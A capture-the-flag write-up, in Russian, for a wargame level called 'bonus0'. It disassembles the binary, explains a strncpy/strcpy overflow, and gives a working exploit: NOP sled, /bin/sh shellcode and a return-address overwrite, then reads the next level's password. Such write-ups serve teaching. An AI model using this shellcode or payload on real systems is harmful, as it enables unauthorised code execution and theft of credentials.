# su bonus0
# pass: f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728

====
Уязвимость: strncpy + strcpy переполнение, вызов шеллкода из другого буфера
====

**Поведение: ждёт ввода ввод 2 строк, разделяя их " - "**
Если в 1 строку передать много символов, то она появится во второй (переполнение). 

# ltrace ./bonus0 
__libc_start_main(0x80485a4, 1, 0xbffff804, 0x80485d0, 0x8048640 <unfinished ...>
puts(" - " - 
)                                                                    = 4
read(0, 123
"123\n", 4096)                                                         = 4
strchr("123\n", '\n')                                                          = "\n"
strncpy(0xbffff6e8, "123", 20)                                                 = 0xbffff6e8
puts(" - " - 
)                                                                    = 4
read(0, 123
"123\n", 4096)                                                         = 4
strchr("123\n", '\n')                                                          = "\n"
strncpy(0xbffff6fc, "123", 20)                                                 = 0xbffff6fc
strcpy(0xbffff736, "123")                                                      = 0xbffff736
strcat("123 ", "123")                                                          = "123 123"
puts("123 123"123 123
)                                                                = 8
+++ exited (status 0) +++

Посмотрим функции: 

# i func
<>
0x080484b4  p
0x0804851e  pp
0x080485a4  main
<>

В мейне просто вызывается pp с буфером и вывод на экран того, что она возвращает

# disas main
Dump of assembler code for function main:
   0x080485a4 <+0>:     push   %ebp
   0x080485a5 <+1>:     mov    %esp,%ebp
   0x080485a7 <+3>:     and    $0xfffffff0,%esp
   0x080485aa <+6>:     sub    $0x40,%esp                   64
   0x080485ad <+9>:     lea    0x16(%esp),%eax              22
   0x080485b1 <+13>:    mov    %eax,(%esp)
   0x080485b4 <+16>:    call   0x804851e <pp>
   0x080485b9 <+21>:    lea    0x16(%esp),%eax
   0x080485bd <+25>:    mov    %eax,(%esp)
   0x080485c0 <+28>:    call   0x80483b0 <puts@plt>
   0x080485c5 <+33>:    mov    $0x0,%eax
   0x080485ca <+38>:    leave  
   0x080485cb <+39>:    ret    
End of assembler dump.

В pp 2 раза вызывается p функция с двумя буферами, а затем формируется общий буфер (две строки соединяются)

# disas pp
Dump of assembler code for function pp:
   0x0804851e <+0>:     push   %ebp
   0x0804851f <+1>:     mov    %esp,%ebp
   0x08048521 <+3>:     push   %edi
   0x08048522 <+4>:     push   %ebx
   0x08048523 <+5>:     sub    $0x50,%esp                       80
   0x08048526 <+8>:     movl   $0x80486a0,0x4(%esp)             " - "
   0x0804852e <+16>:    lea    -0x30(%ebp),%eax                 -48
   0x08048531 <+19>:    mov    %eax,(%esp)
   0x08048534 <+22>:    call   0x80484b4 <p>                    p(" - ")
   0x08048539 <+27>:    movl   $0x80486a0,0x4(%esp)             " - "
   0x08048541 <+35>:    lea    -0x1c(%ebp),%eax                 -28
   0x08048544 <+38>:    mov    %eax,(%esp)
   0x08048547 <+41>:    call   0x80484b4 <p>
   0x0804854c <+46>:    lea    -0x30(%ebp),%eax                 -48
   0x0804854f <+49>:    mov    %eax,0x4(%esp)
   0x08048553 <+53>:    mov    0x8(%ebp),%eax
   0x08048556 <+56>:    mov    %eax,(%esp)
   0x08048559 <+59>:    call   0x80483a0 <strcpy@plt>
   0x0804855e <+64>:    mov    $0x80486a4,%ebx                  " "
   0x08048563 <+69>:    mov    0x8(%ebp),%eax
   0x08048566 <+72>:    movl   $0xffffffff,-0x3c(%ebp)          -60
   0x0804856d <+79>:    mov    %eax,%edx
   0x0804856f <+81>:    mov    $0x0,%eax
   0x08048574 <+86>:    mov    -0x3c(%ebp),%ecx                 -60
   0x08048577 <+89>:    mov    %edx,%edi
   0x08048579 <+91>:    repnz scas %es:(%edi),%al               !=0 
   0x0804857b <+93>:    mov    %ecx,%eax
   0x0804857d <+95>:    not    %eax
   0x0804857f <+97>:    sub    $0x1,%eax                        1
   0x08048582 <+100>:   add    0x8(%ebp),%eax
   0x08048585 <+103>:   movzwl (%ebx),%edx
   0x08048588 <+106>:   mov    %dx,(%eax)
   0x0804858b <+109>:   lea    -0x1c(%ebp),%eax                 -28
   0x0804858e <+112>:   mov    %eax,0x4(%esp)
   0x08048592 <+116>:   mov    0x8(%ebp),%eax
   0x08048595 <+119>:   mov    %eax,(%esp)
   0x08048598 <+122>:   call   0x8048390 <strcat@plt>
   0x0804859d <+127>:   add    $0x50,%esp                       80
   0x080485a0 <+130>:   pop    %ebx
   0x080485a1 <+131>:   pop    %edi
   0x080485a2 <+132>:   pop    %ebp
   0x080485a3 <+133>:   ret    
End of assembler dump.

В p происходит чтение 

# disas p
Dump of assembler code for function p:
   0x080484b4 <+0>:     push   %ebp
   0x080484b5 <+1>:     mov    %esp,%ebp
   0x080484b7 <+3>:     sub    $0x1018,%esp                     4120
   0x080484bd <+9>:     mov    0xc(%ebp),%eax                   12
   0x080484c0 <+12>:    mov    %eax,(%esp)
   0x080484c3 <+15>:    call   0x80483b0 <puts@plt>
   0x080484c8 <+20>:    movl   $0x1000,0x8(%esp)                4096
   0x080484d0 <+28>:    lea    -0x1008(%ebp),%eax               -4120
   0x080484d6 <+34>:    mov    %eax,0x4(%esp)
   0x080484da <+38>:    movl   $0x0,(%esp)                      0
   0x080484e1 <+45>:    call   0x8048380 <read@plt>
   0x080484e6 <+50>:    movl   $0xa,0x4(%esp)                   10
   0x080484ee <+58>:    lea    -0x1008(%ebp),%eax               -4120
   0x080484f4 <+64>:    mov    %eax,(%esp)
   0x080484f7 <+67>:    call   0x80483d0 <strchr@plt>
   0x080484fc <+72>:    movb   $0x0,(%eax)                      0
   0x080484ff <+75>:    lea    -0x1008(%ebp),%eax               -4120
   0x08048505 <+81>:    movl   $0x14,0x8(%esp)                  20
   0x0804850d <+89>:    mov    %eax,0x4(%esp)
   0x08048511 <+93>:    mov    0x8(%ebp),%eax                   8
   0x08048514 <+96>:    mov    %eax,(%esp)                      
   0x08048517 <+99>:    call   0x80483f0 <strncpy@plt>
   0x0804851c <+104>:   leave  
   0x0804851d <+105>:   ret    
End of assembler dump.

В strncpy стоит ограничение по количеству символов для копирования (20). В буфер запишется не более 20 символов. Два буфера разделены пробелом. Не получится записать шеллкод. Но есть большой буфер в функции p, куда мы можем положить шелл код, и он останется там.

Есть фишка в функции strncpy - если подать 20+ символов, то она скопирует ровно 20 и не добавит \0 в конце. То есть потом, когда будет вызвана strcpy, то она скопирует всё, пока не встретит \0 (то есть, будет брать и мусор). Таким образом через переполнение можно добавить в адрес возврата адрес в буфере, где лежит шеллкод.

Для шеллкода используем nop (команда ничего - просто идет дальше), таким образом получится просто дойти до шелл кода, а адрес можно вызвать "приблизительный" между началом буфера и началом шеллкода. 
# b *p+28
# x $ebp-0x1008
0xbfffe630 - начало буфера

Рандомный сдвиг, главное уложиться до 1000
0xbfffe874 - адрес


# python -c 'print "\x90" * 1000+"\x31\xC0\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x50\x53\x89\xE1\xB0\x0B\xCD\x80" + "\x90" * 3072 + "\n" + "B" * 14 + "\x74\xe8\xff\xbf\xff" + "\n"' > /tmp/b0

# cat /tmp/b0 - | ./bonus0

# cat /home/user/bonus1/.pass
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9